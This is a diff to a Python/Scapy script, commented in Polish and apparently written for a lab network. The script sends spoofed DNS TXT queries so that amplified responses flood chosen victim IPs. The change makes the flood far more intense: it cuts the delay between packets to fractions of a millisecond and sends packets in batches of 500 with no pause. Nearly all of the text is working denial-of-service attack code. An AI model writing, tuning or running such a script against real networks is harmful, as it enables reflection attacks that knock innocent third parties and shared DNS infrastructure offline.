@@ -12,8 +12,8 @@ def main():
     parser.add_argument("--dns-servers", default="10.0.2.1", help="Lista adresów IP serwerów DNS rozdzielona przecinkami (np. 10.0.2.1,10.0.4.1)")
     parser.add_argument("--domain", default="psir.proj", help="Domena zapytania DNS (celowo wyzwalająca dużą odpowiedź)")
     parser.add_argument("--count", type=int, default=50, help="Całkowita liczba pakietów do wysłania")
-    parser.add_argument("--min-delay", type=float, default=0.01, help="Minimalne opóźnienie między pakietami (w sekundach)")
-    parser.add_argument("--max-delay", type=float, default=0.05, help="Maksymalne opóźnienie między pakietami (w sekundach)")
+    parser.add_argument("--min-delay", type=float, default=0.0001, help="Minimalne opóźnienie między pakietami (w sekundach)")
+    parser.add_argument("--max-delay", type=float, default=0.0005, help="Maksymalne opóźnienie między pakietami (w sekundach)")
     
     args = parser.parse_args()
 
@@ -32,30 +32,23 @@ def main():
     print(f"    - Opóźnienie losowe: od {min_delay}s do {max_delay}s")
 
     try:
-        print(f"[*] Rozpoczynam wysyłanie pakietów z opóźnieniem...")
-        sent_packets = 0
+        print(f"[*] Generowanie i wysyłanie {count} pakietów w paczkach...")
         
-        for i in range(count):
-            # Losowanie ofiary oraz serwera DNS
-            current_victim = random.choice(victims)
-            current_dns = random.choice(dns_servers)
-
-            # Konstrukcja pakietu
-            packet = IP(src=current_victim, dst=current_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))
+        batch_size = 500
+        sent = 0
+        for i in range(0, count, batch_size):
+            packets = []
+            for _ in range(min(batch_size, count - sent)):
+                current_victim = random.choice(victims)
+                current_dns = random.choice(dns_servers)
+                packets.append(
+                    IP(src=current_victim, dst=current_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))
+                )
             
-            # Wysłanie pojedynczego pakietu
-            send(packet, verbose=False)
-            sent_packets += 1
-
-            if sent_packets % 10 == 0 or sent_packets == count:
-                print(f"[+] Wysłano pakiet {sent_packets}/{count} (Ofiara: {current_victim} -> DNS: {current_dns})")
-
-            # Losowe opóźnienie
-            delay = random.uniform(min_delay, max_delay)
-            time.sleep(delay)
-
-        print(f"[+] Zakończono pomyślnie! Łącznie wysłano {sent_packets} sfałszowanych pakietów.")
-
+            send(packets, inter=0, verbose=False)
+            sent += len(packets)
+            print(f"[+] Wysłano {sent}/{count} pakietów.")
+            
     except KeyboardInterrupt:
         print("\n[-] Atak przerwany przez użytkownika.")
         sys.exit(0)
